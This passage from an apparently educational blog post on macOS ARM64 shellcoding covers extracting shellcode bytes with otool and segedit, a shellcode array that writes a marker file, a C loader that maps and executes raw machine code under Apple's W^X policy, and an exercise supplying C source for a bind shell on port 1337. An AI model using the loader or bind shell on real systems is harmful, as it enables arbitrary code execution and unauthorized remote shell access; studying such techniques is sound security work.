- Don’t panic about the `<ltmp0>` label — that’s just the local temp label `clang`’s assembler emits for the code block; `_main` is still there as the global symbol at the same address (check with `nm execute.o`).
- `adr x11, 0x64 <cmd>` still resolves to our `cmd:` label — The position-independent trick survived the whole disassembly, Perfect.
- And just like in the `x86_64` post, `objdump` blindly disassembles our `cmd:` string data as "instructions" — That `umlml2.4s v5, v27, v8[2]` nonsense at `0x64` is literally the bytes of `echo "W00tW00t" > /tmp/Pwned.txt` being interpreted as code. Same restaurant, Same garbage.

## otool

- Let’s dump the raw section bytes with `otool`:

```
shellcoding % otool -s __TEXT __text ~/shellcoding/execute.o

execute.o:
(__TEXT,__text) section
0000000000000000 d100c3ff d28c45e9 f2adcd29 f2ce65e9 
0000000000000010 f2e00d09 f80003e9 d28c65aa f80083ea 
0000000000000020 1000022b 910003e3 910023e4 f9000be3 
0000000000000030 f9000fe4 f90013eb f90017ff 910003e0 
0000000000000040 910043e1 aa1f03e2 d2800770 f2a04010 
0000000000000050 d4001001 d2800030 f2a04010 d2800000 
0000000000000060 d4001001 6f686365 30572220 30577430 
0000000000000070 20227430 742f203e 502f706d 64656e77 
0000000000000080 7478742e 00000000 
```

Looks perfect, Right? Now stop and look VERY carefully at the last rows, Cause here it comes…

## The ARM64 Byte-Order Trap

In our `x86_64` blogpost we extracted the shellcode by piping `objdump`/`otool` output through `grep`/`awk` to grab the hex bytes, Then `xxd -r -p` to binary. If you try the exact same pipeline here, You will ship **broken shellcode**. Look at the string bytes in the `otool` dump above: `6f686365` — read as bytes that’s `ohce`, But our string starts with `echo`! What’s going on?

The answer: on `ARM64`, Both `objdump` and `otool` print each 4-byte group as a 32-bit **word value** (`d100c3ff` is the *instruction value*), While the actual bytes in the file are **little-endian** (`ff c3 00 d1`). On `x86_64` the tools printed byte-by-byte in order, So the naive pipeline worked. Here, `xxd -r -p` on that output gives you every 4-byte group reversed — Byte-swapped garbage that will never execute. This is the kind of silent bug that costs you hours in debugging, Cause the hex *looks* right.

You *can* fix it in the pipeline by reversing each word:

```bash
shellcoding % otool -s __TEXT __text ~/shellcoding/execute.o \
  | sed -n '3,$p' \
  | awk '{ for(i=2;i<=NF;i++) printf "%s%s%s%s", substr($i,7,2), substr($i,5,2), substr($i,3,2), substr($i,1,2) } END{ print "" }' > shellcode.hex
```

But there is a cleaner native way, And honestly the tool Apple gave us for exactly this job:

## segedit: The Clean Way

`segedit` extracts a section’s raw bytes from a `Mach-O` directly — no hex parsing, No byte-order gymnastics, No padding surprises (`otool` pads its display to word boundaries, `segedit` gives you the exact section):

```
shellcoding % segedit ~/shellcoding/execute.o -extract __TEXT __text shellcode.bin
shellcoding % wc -c shellcode.bin
     133 shellcode.bin // 133 bytes
shellcoding % xxd shellcode.bin | head -3
00000000: ffc3 00d1 e945 8cd2 29cd adf2 e965 cef2  .....E..)....e..
00000010: 090d e0f2 e903 00f8 aa65 8cd2 ea83 00f8  .........e......
00000020: cb02 0010 e303 0091 e423 0091 e30b 00f9  .........#......
shellcoding % xxd shellcode.bin | tail -3
00000050: 0110 00d4 6563 686f 2022 5730            ....echo "W0
00000060: 3074 5730 3074 2220 3e20 2f74 6d70 2f50  0tW00t" > /tmp/P
00000070: 776e 6564 2e74 7874 00                   wned.txt.
```

Look at that — the first bytes are `ff c3 00 d1` (the real little-endian encoding of `sub sp, sp, #0x30`), And the string at the end reads `wned.txt.` from `Pwned.txt` in perfect order. `133` bytes: `100` bytes of code + `33` bytes of our command string (including its `NULL` terminator).

- Convert it to the `C` array we will need for the loader:

```
shellcoding % xxd -i shellcode.bin > shellcode.h
shellcoding % cat shellcode.h
unsigned char shellcode_bin[] = {
  0xff, 0xc3, 0x00, 0xd1, 0xe9, 0x45, 0x8c, 0xd2, 0x29, 0xcd, 0xad, 0xf2,
  0xe9, 0x65, 0xce, 0xf2, 0x09, 0x0d, 0xe0, 0xf2, 0xe9, 0x03, 0x00, 0xf8,
  0xaa, 0x65, 0x8c, 0xd2, 0xea, 0x83, 0x00, 0xf8, 0x2b, 0x02, 0x00, 0x10,
  0xe3, 0x03, 0x00, 0x91, 0xe4, 0x23, 0x00, 0x91, 0xe3, 0x0b, 0x00, 0xf9,
  0xe4, 0x0f, 0x00, 0xf9, 0xeb, 0x13, 0x00, 0xf9, 0xff, 0x17, 0x00, 0xf9,
  0xe0, 0x03, 0x00, 0x91, 0xe1, 0x43, 0x00, 0x91, 0xe2, 0x03, 0x1f, 0xaa,
  0x70, 0x07, 0x80, 0xd2, 0x10, 0x40, 0xa0, 0xf2, 0x01, 0x10, 0x00, 0xd4,
  0x30, 0x00, 0x80, 0xd2, 0x10, 0x40, 0xa0, 0xf2, 0x00, 0x00, 0x80, 0xd2,
  0x01, 0x10, 0x00, 0xd4, 0x65, 0x63, 0x68, 0x6f, 0x20, 0x22, 0x57, 0x30,
  0x30, 0x74, 0x57, 0x30, 0x30, 0x74, 0x22, 0x20, 0x3e, 0x20, 0x2f, 0x74,
  0x6d, 0x70, 0x2f, 0x50, 0x77, 0x6e, 0x65, 0x64, 0x2e, 0x74, 0x78, 0x74,
  0x00
};
unsigned int shellcode_bin_len = 133;
```

## Test Shellcode with Loader

Now, Let’s write a loader in `C` — structurally the same loader from our `x86_64` blogpost: `fork()` a child, map the shellcode, copy it, cast to a function pointer and call it, While the parent `waitpid()`s and checks the side-effect. But if you take the `x86_64` loader *unchanged*, Apple Silicon will slap you too. Watch:

```C
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/wait.h>
#include <stdlib.h>

int main(void) {
    unsigned char code[] = {
      /* paste your extracted ARM64 shellcode bytes from xxd -i here */
    };
    size_t len = sizeof(code);

    pid_t pid = fork();
    if (pid < 0) {
        perror("fork");
        return 1;
    }

    if (pid == 0) {
        // child: allocate RWX, copy shellcode and execute
        void *exec = mmap(NULL, len, PROT_READ|PROT_WRITE|PROT_EXEC,
                          MAP_ANON|MAP_PRIVATE, -1, 0);
        if (exec == MAP_FAILED) {
            perror("mmap");
            _exit(127);
        }
        memcpy(exec, code, len);

        printf("[child %d] executing shellcode (%zu bytes)...\n", getpid(), len);
        fflush(stdout);

        int (*func)() = (int(*)())exec;
        int r = func();
        printf("[child %d] shellcode returned %d\n", getpid(), r);
        fflush(stdout);
        _exit(r & 0xFF);
    } else {
        // parent: wait for child and then check side-effect
        int status = 0;
        printf("[parent %d] spawned child %d, waiting...\n", getpid(), pid);
        fflush(stdout);

        if (waitpid(pid, &status, 0) == -1) {
            perror("waitpid");
            return 2;
        }

        if (WIFEXITED(status)) {
            printf("[parent] child exited with status %d\n", WEXITSTATUS(status));
        } else if (WIFSIGNALED(status)) {
            printf("[parent] child killed by signal %d\n", WTERMSIG(status));
        } else {
            printf("[parent] child ended with status 0x%x\n", status);
        }

        usleep(200000);

        const char *check_path = "/tmp/Pwned.txt";
        if (access(check_path, F_OK) == 0) {
            printf("[parent] Success: '%s' exists.\n", check_path);
            return 0;
        } else {
            printf("[parent] Failure: '%s' not found (errno=%d: %s)\n",
                   check_path, errno, strerror(errno));
            return 3;
        }
    }
}
```

Paste your real `code[]` bytes in, Compile it, Run it, And here is what happens on Apple Silicon:

```
shellcoding % clang -arch arm64 -o cloader cloader.c
shellcoding % ./cloader 
[parent 39201] spawned child 39202, waiting...
mmap: Permission denied
[parent] child exited with status 127
[parent] Failure: '/tmp/Pwned.txt' not found (errno=2: No such file or directory)
```

`mmap: Permission denied` — This is the `W^X` (Write XOR Execute) policy that Apple enforces on `Apple Silicon`: you simply cannot ask for a page that is **writable and executable at the same time** like we casually did on `x86_64`. This is exactly the kind of architecture difference that makes porting shellcode knowledge to `ARM64` fun. The fix is the classic `W^X`-compliant dance: map the page `RW`, copy the shellcode in, Then flip it to `RX` with `mprotect` — never writable and executable at the same time:

```C
    if (pid == 0) {
        // child: allocate RW, copy shellcode, then flip to RX (W^X — required on Apple Silicon)
        void *exec = mmap(NULL, len, PROT_READ|PROT_WRITE,
                          MAP_ANON|MAP_PRIVATE, -1, 0);
        if (exec == MAP_FAILED) {
            perror("mmap");
            _exit(127);
        }
        memcpy(exec, code, len);
        if (mprotect(exec, len, PROT_READ|PROT_EXEC) != 0) {
            perror("mprotect");
            _exit(126);
        }

        printf("[child %d] executing shellcode (%zu bytes)...\n", getpid(), len);
        fflush(stdout);

        int (*func)() = (int(*)())exec;
        int r = func();
        printf("[child %d] shellcode returned %d\n", getpid(), r);
        fflush(stdout);
        _exit(r & 0xFF);
    }
```

> Note: The other Apple-blessed way is `MAP_JIT` with `pthread_jit_write_protect_np()` to toggle writability around the copy — that’s what JavaScriptCore and real JIT engines use. For a loader, The `RW` → copy → `mprotect(RX)` dance is simpler and works everywhere.

Now run the fixed loader:

```
shellcoding % clang -arch arm64 -o cloader cloader.c
shellcoding % ./cloader 
[parent 39201] spawned child 39202, waiting...
[child 39202] executing shellcode (133 bytes)...
[parent] child exited with status 0
[parent] Success: '/tmp/Pwned.txt' exists.
shellcoding % cat /tmp/Pwned.txt 
W00tW00t
```

As we can see our shellcode executed successfully with no issues.

The loader’s job is the same as the `x86_64` one: it stores raw machine-code bytes (the shellcode) in a C `unsigned char` array, allocates a memory region, copies the bytes into that region, casts the region pointer to a function pointer, and then calls it. That direct transfer of control is what lets the program run arbitrary machine code in the address space of the process. Two `ARM64`-specific gotchas to keep in mind for your own loaders: first, The `W^X` mapping policy we just handled; Second, If you ever write shellcode that wants to *return* to the loader, `X29` (frame pointer) and `X30` (link register) must either not be touched, or must be saved and restored before returning (`stp`/`ldp` — `Store`/`Load Pair`), Otherwise the loader will crash the moment control comes back. Our shellcode plays it safe by ending with `execve`/`exit` so control never returns.

# Exercises

If you want to dive deeper more, you can do this exercise which is involving in creating a `BindShell` shellcode for `ARM64` and execute it — the same `BindShell` `C` code from the `x86_64` post works just fine here since it’s pure `C`/`POSIX`:

```C
// Source - https://stackoverflow.com/q
// Posted by gatorface, modified by community. See post 'Timeline' for change history
// Retrieved 2025-11-10, License - CC BY-SA 3.0

// Author:  Julien Ahrens (@MrTuxracer)
// Website:  http://www.rcesecurity.com 

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(void)
{
    int i; // used for dup2 later
    int sockfd; // socket file descriptor
    int clientfd; // client file descriptor
    socklen_t socklen; // socket-length for new connections

    struct sockaddr_in srv_addr; // server aka listen address
    struct sockaddr_in cli_addr; // client address

    srv_addr.sin_family = AF_INET; // server socket type address family = internet protocol address
    srv_addr.sin_port = htons( 1337 ); // server port, converted to network byte order
    srv_addr.sin_addr.s_addr = htonl (INADDR_ANY); // listen on any address, converted to network byte order

    // create new TCP socket
    sockfd = socket(2, 1, 0);

    // bind socket
    bind( sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr) );

    // listen on socket
    listen(sockfd, 0);

    // accept new connections
    socklen = sizeof(cli_addr);
    clientfd = accept(sockfd, (struct sockaddr *)&cli_addr, &socklen );

    // dup2-loop to redirect stdin(0), stdout(1) and stderr(2)
    for(i = 0; i <= 2; i++)
        dup2(clientfd, i);

    // magic
    // execve( "/bin/sh", NULL, NULL );

    //UPDATE: fixed exec call, shell still not returned to
    // client connecting with execl or proper execve
    execl("/bin/sh", "/bin/sh", (char *)NULL);
}
```

Tasks:

- Use `execve()` instead of `execl` — and remember your `NULL` terminator for the `argv` array, Plus pointers not values.
- Collect the syscall for `socket`,`bind`,`listen`,`accept` and `dup2`. As you will use it to build your `BindShell`.
- Study the functions arguments and get it ready for the functions/syscalls
- Make sure to go around with the `struct`, Cause it’s similler to the way we built arrays
- Make sure to use the kernel source code to hop-around to find a variable value, like the `#define AF_INET` for example and explore the source code to help you creating your shellcode.
- This time, Remember that your syscall numbers go in `X16` and the syscall instruction is `svc #0x80`.
- Make sure to keep your stack `16-byte` aligned all the way, Cause the alignment faults on `ARM64` are not as forgiving as `x86_64`.

## Help ?

If you got any questions or need help, You can contact me:

- [Linkedin](https://www.linkedin.com/in/zer0verflow/)
- [Twitter/X](https://x.com/AzimaZeyad)
- Email: [contact@zeyadazima.com](mailto:contact@zeyadazima.com)
- Discord: `.killer_1337` including `.`

# Conclusion

We extended our `macOS` shellcoding series from `x86_64` into the native `ARM64` (`AArch64`) architecture used by modern `Apple Silicon` Macs. We set up a proper lab environment using `clang` instead of `nasm` (which doesn’t speak ARM at all), Reused the exact same `XNU` syscall class encoding trick from the `x86_64` post but loading the ticket in `X16` and ringing `svc #0x80` instead of `RAX` + `syscall`, and learned the `ARM64` calling conventions: `X0-X7` for arguments, `X16` for the syscall number, and the strict `16-byte` stack alignment that the kernel actually enforces with alignment faults. We also saw how fixed-size instructions change our shellcode-writing habits — Building strings with `movz`/`movk` chunk by chunk instead of one-shot pushes, and using `adr` for the position-independent string trick which is even cleaner than its `x86_64` sibling. Along the way we hit the real `ARM64` gotchas that no `x86_64` guide will warn you about: the exit-less shellcode dying with `SIGILL` (illegal hardware instruction) instead of a segfault, The `execve` pointer-vs-value and `NULL`-termination traps, The `otool`/`objdump` byte-order trap that silently breaks extracted shellcode (and the `segedit` fix), And Apple’s `W^X` policy that denies `RWX` mappings on Apple Silicon. By following our structured workflow — starting from `C` code, identifying syscalls from `syscalls.master`, converting to assembly, and handling arguments — we successfully created shellcodes for printing text, terminating processes, and executing commands, All tested on real hardware. This foundation sets the stage for more advanced topics.

# References

- https://codebrowser.dev/
- https://man.freebsd.org/
- https://pubs.opengroup.org
- https://man7.org/linux/man-pages/
- https://opensource.apple.com/releases/
- https://github.com/apple-oss-distributions/xnu
- https://xcodereleases.com
- https://newosxbook.com
- https://developer.arm.com/documentation/102374/latest
